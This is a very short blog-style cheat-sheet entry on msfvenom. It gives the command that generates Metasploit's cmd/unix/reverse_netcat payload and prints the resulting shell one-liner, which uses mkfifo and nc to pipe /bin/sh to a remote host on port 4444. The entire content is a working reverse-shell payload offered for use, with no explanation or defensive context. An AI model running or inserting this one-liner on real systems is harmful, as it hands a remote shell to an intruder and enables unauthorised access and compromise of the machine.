---
layout: post
title: "msfvenom"
keywords: "msf, metasploit, payloads, msfvenom"
---

### cmd/unix/reverse_netcat
`msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=4444 R`
```
mkfifo /tmp/xrdqdir; nc <IP> 4444 0</tmp/xrdqdir | /bin/sh >/tmp/xrdqdir 2>&1; rm /tmp/xrdqdir
```